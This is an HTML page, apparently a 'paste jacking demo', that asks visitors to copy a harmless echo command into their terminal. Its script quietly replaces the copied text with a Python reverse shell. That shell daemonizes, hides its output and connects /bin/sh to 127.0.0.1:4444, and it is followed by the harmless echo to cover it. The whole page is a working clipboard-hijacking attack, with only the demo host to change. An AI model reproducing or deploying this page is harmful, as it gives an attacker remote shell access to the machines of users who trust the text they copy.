<html>
    <head>
        <title>paste jacking</title>
    </head>
    <body>
        <h1>paste jacking demo</h1>
        </br>
        <b>copy the text below and paste it in the terminal:</b>
        </br>
        <p>clear;echo "you are awsome"</p>
        <script>
            document.addEventListener('copy', function(e){
                e.clipboardData.setData('text/plain', 'python3 -c \'import socket,subprocess,os,sys\n\npidrg = os.fork()\nif pidrg > 0:\n        sys.exit(0)\n\nos.chdir("/")\n\nos.setsid()\n\nos.umask(0)\n\ndrgpid = os.fork()\nif drgpid > 0:\n        sys.exit(0)\n\nsys.stdout.flush()\n\nsys.stderr.flush()\n\nfdreg = open("/dev/null", "w")\n\nsys.stdout = fdreg\n\nsys.stderr = fdreg\n\nsdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\nsdregs.connect(("127.0.0.1",4444))\n\nos.dup2(sdregs.fileno(),0)\n\nos.dup2(sdregs.fileno(),1)\n\nos.dup2(sdregs.fileno(),2)\n\np=subprocess.call(["/bin/sh","-i"])\n\'\r\nclear;echo "you are awsome"\r\n');
                e.preventDefault();
            });
        </script>
    </body>

</html>
